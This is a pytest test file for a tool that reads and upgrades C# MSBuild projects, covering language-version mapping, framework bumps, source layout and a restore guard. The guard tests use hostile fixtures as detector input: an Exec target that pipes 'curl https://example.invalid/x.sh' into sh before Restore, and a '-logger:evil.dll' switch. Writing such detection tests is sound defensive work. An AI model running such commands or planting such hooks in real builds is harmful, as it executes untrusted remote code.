"""MSBuild project files: standards, the bump, the layout and the restore guard (SPEC §11.3)."""

from __future__ import annotations

from pathlib import Path

import pytest

from codecoremorph.adapters.csharp.msbuild import (
    bump_project,
    code_constructs,
    entry_point,
    framework_standard,
    layout,
    lowest_standard,
    project_info,
    solution_projects,
    standard_for_lang_version,
    standard_text,
)
from codecoremorph.core.globs import PathMatcher

PROJECT = """<Project Sdk="Microsoft.NET.Sdk">

  <PropertyGroup>
    <TargetFramework>net6.0</TargetFramework>
    <LangVersion>7.3</LangVersion>
  </PropertyGroup>

</Project>
"""


@pytest.mark.parametrize(
    ("value", "standard"),
    [
        ("7.3", "csharp7.3"),
        ("7", "csharp7.3"),
        ("6", "csharp7.3"),
        ("ISO-2", "csharp7.3"),
        ("8.0", "csharp8"),
        ("10", "csharp10"),
        ("12.0", "csharp12"),
        ("14", "csharp14"),
        ("15", "csharp14"),
        ("latest", None),
        ("preview", None),
        ("default", None),
    ],
)
def test_a_lang_version_names_its_standard(value: str, standard: str | None) -> None:
    assert standard_for_lang_version(value) == standard


@pytest.mark.parametrize(
    ("tfm", "standard"),
    [
        ("net48", "csharp7.3"),
        ("net462", "csharp7.3"),
        ("netstandard2.0", "csharp7.3"),
        ("netstandard2.1", "csharp8"),
        ("netcoreapp2.1", "csharp7.3"),
        ("netcoreapp3.1", "csharp8"),
        ("net5.0", "csharp9"),
        ("net6.0", "csharp10"),
        ("net6.0-windows", "csharp10"),
        ("net8.0", "csharp12"),
        ("net10.0", "csharp14"),
        ("net11.0", "csharp14"),
        ("monoandroid90", None),
    ],
)
def test_a_framework_has_a_default_standard(tfm: str, standard: str | None) -> None:
    assert framework_standard(tfm) == standard


def test_standard_text() -> None:
    assert standard_text("csharp7.3") == "7.3"
    assert standard_text("csharp12") == "12.0"


def test_a_project_s_standard_is_its_lang_version_else_its_framework_s() -> None:
    assert project_info(PROJECT).standard == "csharp7.3"
    plain = PROJECT.replace("    <LangVersion>7.3</LangVersion>\n", "")
    assert project_info(plain).standard == "csharp10"
    latest = PROJECT.replace("7.3", "latest")
    assert project_info(latest).standard == "csharp10"
    multi = plain.replace(
        "<TargetFramework>net6.0</TargetFramework>",
        "<TargetFrameworks>net8.0;netstandard2.0</TargetFrameworks>",
    )
    assert project_info(multi).standard == "csharp7.3"


def test_a_project_inherits_directory_build_props() -> None:
    plain = PROJECT.replace("    <LangVersion>7.3</LangVersion>\n", "")
    info = project_info(plain, {"LangVersion": "8.0"})
    assert info.standard == "csharp8"
    resolved = plain.replace("net6.0", "$(Common)")
    assert project_info(resolved, {"Common": "net8.0"}).frameworks == ["net8.0"]


def test_comments_are_not_read() -> None:
    commented = PROJECT.replace(
        "<LangVersion>7.3</LangVersion>", "<!-- <LangVersion>12</LangVersion> -->"
    )
    assert project_info(commented).lang_version is None


def test_test_projects_are_recognized() -> None:
    test = PROJECT.replace(
        "</Project>",
        '  <ItemGroup><PackageReference Include="Microsoft.NET.Test.Sdk" Version="17.8.0" />'
        "</ItemGroup>\n</Project>",
    )
    assert project_info(test).test_project
    assert not project_info(PROJECT).test_project


def test_programs_are_recognized() -> None:
    """``OutputType`` Exe or WinExe, set by the project or by the props above it (D-78)."""
    program = PROJECT.replace(
        "</PropertyGroup>", "  <OutputType>Exe</OutputType>\n  </PropertyGroup>", 1
    )
    assert project_info(program).executable
    assert project_info(PROJECT, {"OutputType": "WinExe"}).executable
    assert not project_info(PROJECT).executable
    assert not project_info(PROJECT, {"OutputType": "Library"}).executable


# ------------------------------------------------------------------------------- the bump


def test_the_bump_raises_framework_and_language() -> None:
    edit = bump_project(PROJECT, "csharp14")
    assert "<TargetFramework>net10.0</TargetFramework>" in edit.text
    assert "<LangVersion>14.0</LangVersion>" in edit.text
    assert edit.replacements == 2
    assert edit.text.count("\n") == PROJECT.count("\n")


def test_the_bump_keeps_an_os_suffix_and_dedupes_frameworks() -> None:
    text = PROJECT.replace(
        "<TargetFramework>net6.0</TargetFramework>",
        "<TargetFrameworks>net6.0-windows;net7.0-windows;netstandard2.0</TargetFrameworks>",
    )
    edit = bump_project(text, "csharp12")
    assert "<TargetFrameworks>net8.0-windows;netstandard2.0</TargetFrameworks>" in edit.text


def test_a_netstandard_library_keeps_its_framework_and_gains_a_lang_version() -> None:
    text = (
        '<Project Sdk="Microsoft.NET.Sdk">\r\n  <PropertyGroup>\r\n'
        "    <TargetFramework>netstandard2.0</TargetFramework>\r\n"
        "  </PropertyGroup>\r\n</Project>\r\n"
    )
    edit = bump_project(text, "csharp12")
    assert (
        "<TargetFramework>netstandard2.0</TargetFramework>\r\n"
        "    <LangVersion>12.0</LangVersion>\r\n"
    ) in edit.text
    assert edit.replacements == 1


def test_an_inherited_lang_version_as_new_adds_none() -> None:
    text = PROJECT.replace("    <LangVersion>7.3</LangVersion>\n", "").replace(
        "net6.0", "netstandard2.0"
    )
    assert bump_project(text, "csharp12", inherited_lang="12.0").replacements == 0
    assert bump_project(text, "csharp12", inherited_lang="7.3").replacements == 1


def test_newer_and_keyword_lang_versions_stay() -> None:
    assert bump_project(PROJECT.replace("7.3", "latest"), "csharp12").text.count("latest") == 1
    newer = PROJECT.replace("7.3", "14.0")
    assert "<LangVersion>14.0</LangVersion>" in bump_project(newer, "csharp12").text


def test_a_project_already_at_the_target_is_left_alone() -> None:
    text = PROJECT.replace("net6.0", "net10.0").replace("7.3", "14.0")
    assert bump_project(text, "csharp14").replacements == 0


def test_the_bump_ignores_commented_elements() -> None:
    text = PROJECT.replace(
        "  </PropertyGroup>",
        "    <!-- <TargetFramework>net5.0</TargetFramework> -->\n  </PropertyGroup>",
    )
    edit = bump_project(text, "csharp14")
    assert "<!-- <TargetFramework>net5.0</TargetFramework> -->" in edit.text


# ------------------------------------------------------------------------------- the layout


def _write(root: Path, files: dict[str, str]) -> None:
    for rel, text in files.items():
        path = root / rel
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(text, encoding="utf-8")


def test_layout_follows_msbuild_s_default_globs(tmp_path: Path) -> None:
    _write(
        tmp_path,
        {
            "App.sln": "",
            "src/Lib/Lib.csproj": PROJECT.replace(
                "</Project>",
                '  <ItemGroup>\n    <Compile Remove="Generated/**" />\n'
                '    <Compile Include="..\\Shared\\Common.cs" />\n  </ItemGroup>\n</Project>',
            ),
            "src/Lib/A.cs": "",
            "src/Lib/Deep/B.cs": "",
            "src/Lib/Generated/G.cs": "",
            "src/Lib/obj/Debug/x.cs": "",
            "src/Lib/bin/y.cs": "",
            "src/Shared/Common.cs": "",
            "tools/script.cs": "",
            "Directory.Build.props": "<Project />",
            "nuget.config": "<configuration />",
        },
    )
    lay = layout(tmp_path, PathMatcher())
    assert lay.projects == ["src/Lib/Lib.csproj"]
    assert lay.sources["src/Lib/Lib.csproj"] == [
        "src/Lib/A.cs",
        "src/Lib/Deep/B.cs",
        "src/Shared/Common.cs",
    ]
    assert lay.uncompiled == ["src/Lib/Generated/G.cs", "tools/script.cs"]
    assert set(lay.build_files) == {"App.sln", "Directory.Build.props", "nuget.config"}
    assert entry_point(tmp_path, lay) == "App.sln"


def test_a_shared_project_s_items_are_its_importers_own(tmp_path: Path) -> None:
    """A shared project (``.projitems``, D-82): the projects that import it compile its items,
    ``$(MSBuildThisFileDirectory)`` being its own directory (libsodium-core's Interop)."""
    _write(
        tmp_path,
        {
            "src/Lib/Lib.csproj": PROJECT.replace(
                "</Project>",
                '  <Import Project="..\\Interop\\Interop.projitems" Label="Shared" />\n</Project>',
            ),
            "src/Lib/A.cs": "",
            "src/Interop/Interop.projitems": (
                "<Project>\n  <ItemGroup>\n"
                '    <Compile Include="$(MSBuildThisFileDirectory)Interop.Core.cs" />\n'
                '    <Compile Include="$(MSBuildThisFileDirectory)Box/*.cs" />\n'
                "  </ItemGroup>\n</Project>\n"
            ),
            "src/Interop/Interop.Core.cs": "",
            "src/Interop/Box/Interop.Box.cs": "",
            "src/Interop/Unlisted.cs": "",
        },
    )
    lay = layout(tmp_path, PathMatcher())
    assert lay.sources["src/Lib/Lib.csproj"] == [
        "src/Interop/Box/Interop.Box.cs",
        "src/Interop/Interop.Core.cs",
        "src/Lib/A.cs",
    ]
    assert lay.uncompiled == ["src/Interop/Unlisted.cs"]


def test_checked_arithmetic_is_recognized() -> None:
    checked = "<CheckForOverflowUnderflow>true</CheckForOverflowUnderflow>"
    assert project_info(
        PROJECT.replace("<PropertyGroup>", f"<PropertyGroup>{checked}")
    ).checked_arithmetic
    assert not project_info(PROJECT).checked_arithmetic
    inherited = {"CheckForOverflowUnderflow": "True"}
    assert project_info(PROJECT, inherited).checked_arithmetic


def test_an_old_style_project_compiles_only_what_it_lists(tmp_path: Path) -> None:
    old = (
        '<Project ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">\n'
        '  <ItemGroup><Compile Include="Listed.cs" /></ItemGroup>\n</Project>\n'
    )
    _write(tmp_path, {"Old.csproj": old, "Listed.cs": "", "Other.cs": ""})
    lay = layout(tmp_path, PathMatcher())
    assert lay.sources["Old.csproj"] == ["Listed.cs"]
    assert lay.uncompiled == ["Other.cs"]
    assert entry_point(tmp_path, lay) == "Old.csproj"


def test_references_and_entry_points(tmp_path: Path) -> None:
    app = PROJECT.replace(
        "</Project>",
        '  <ItemGroup><ProjectReference Include="..\\Core\\Core.csproj" /></ItemGroup>\n</Project>',
    )
    _write(tmp_path, {"src/App/App.csproj": app, "src/Core/Core.csproj": PROJECT})
    lay = layout(tmp_path, PathMatcher())
    assert lay.references["src/App/App.csproj"] == ["src/Core/Core.csproj"]
    assert entry_point(tmp_path, lay) is None  # the adapter writes a solution of its own
    _write(tmp_path, {"Both.sln": "", "Both.slnx": ""})
    assert entry_point(tmp_path, layout(tmp_path, PathMatcher())) == "Both.sln"
    _write(tmp_path, {"Other.sln": ""})
    assert entry_point(tmp_path, layout(tmp_path, PathMatcher())) is None


def test_excluded_paths_are_left_out(tmp_path: Path) -> None:
    _write(tmp_path, {"A.csproj": PROJECT, "A.cs": "", "vendor/V.cs": ""})
    lay = layout(tmp_path, PathMatcher(["vendor/**"]))
    assert lay.sources["A.csproj"] == ["A.cs"]
    assert lay.uncompiled == []


def test_the_lowest_standard_leaves_test_projects_out(tmp_path: Path) -> None:
    test = PROJECT.replace("7.3", "6").replace(
        "</Project>",
        '  <ItemGroup><PackageReference Include="Microsoft.NET.Test.Sdk" Version="17.8.0" />'
        "</ItemGroup>\n</Project>",
    )
    _write(
        tmp_path,
        {
            "src/A/A.csproj": PROJECT.replace("    <LangVersion>7.3</LangVersion>\n", ""),
            "tests/T/T.csproj": test,
        },
    )
    assert lowest_standard(tmp_path, layout(tmp_path, PathMatcher())) == "csharp10"


def test_solutions_list_their_csharp_projects() -> None:
    sln = (
        'Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "A", "src\\A\\A.csproj", "{1}"\n'
        'Project("{2150E333-8FDC-42A3-9474-1A3956D46DE8}") = "folder", "folder", "{2}"\n'
    )
    assert solution_projects(sln, slnx=False) == ["src/A/A.csproj"]
    slnx = '<Solution>\n  <Project Path="src/B/B.csproj" />\n</Solution>\n'
    assert solution_projects(slnx, slnx=True) == ["src/B/B.csproj"]


# --------------------------------------------------------------------------- restore guard


def test_code_running_constructs_are_found() -> None:
    text = """<Project Sdk="Microsoft.NET.Sdk">
  <Target Name="Fetch" BeforeTargets="Restore">
    <Exec Command="curl https://example.invalid/x.sh | sh" />
  </Target>
  <!-- <Exec Command="commented" /> -->
  <Import Project="extra.targets" />
  <UsingTask TaskName="Inline" TaskFactory="RoslynCodeTaskFactory" />
  <ItemGroup><Analyzer Include="tools/a.dll" /></ItemGroup>
</Project>
"""
    found = code_constructs("src/A/A.csproj", text)
    kinds = sorted({f.split(" in ")[0] for f in found})
    assert kinds == [
        "a target",
        "an Exec task",
        "an analyzer",
        "an import",
        "an inline task (UsingTask)",
    ]
    assert not any("commented" in f for f in found)


def test_msbuild_sdks_other_than_dotnet_s_are_found() -> None:
    assert code_constructs("A.csproj", '<Project Sdk="Microsoft.NET.Sdk.Web" />') == []
    found = code_constructs("A.csproj", '<Project Sdk="MSBuild.Sdk.Extras/3.0.44" />')
    assert found
    assert found[0].startswith("an MSBuild SDK")


def test_nuget_sources_response_files_and_global_json() -> None:
    config = (
        '<configuration><packageSources><add key="x" value="https://x.invalid/v3" />'
        "</packageSources></configuration>"
    )
    assert code_constructs("nuget.config", config)[0].startswith("a package source")
    assert code_constructs("Directory.Build.rsp", "-logger:evil.dll")[0].startswith(
        "MSBuild switches"
    )
    assert code_constructs("Directory.Build.rsp", "  \n") == []
    assert code_constructs("global.json", '{"msbuild-sdks": {"X": "1.0"}}')
    assert code_constructs("global.json", '{"sdk": {"version": "6.0.100"}}') == []
